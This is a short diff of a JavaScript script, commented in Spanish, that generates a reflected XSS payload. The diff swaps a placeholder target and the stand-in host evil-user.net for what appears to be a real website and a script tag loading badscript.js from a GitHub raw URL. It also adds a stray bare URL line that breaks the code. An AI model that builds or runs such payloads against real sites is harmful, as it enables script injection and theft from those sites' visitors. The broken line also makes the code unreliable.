@@ -1,7 +1,8 @@
 // Script para generar payload XSS reflected
 function generateXSSPayload() {
-    const baseUrl = 'https://insecure-website.com/comment';
-    const message = '<script src=https://evil-user.net/badscript.js></script>';
+    const baseUrl = 'https://www.dr-farfar.com/';
+    https://www.dr-farfar.com/
+    const message = '<script src=https://raw.githubusercontent.com/Accdecer/RepositoriodeAccde/refs/heads/main/badscript.js></script>';
     
     // URL encode del mensaje para evitar problemas
     const encodedMessage = encodeURIComponent(message);
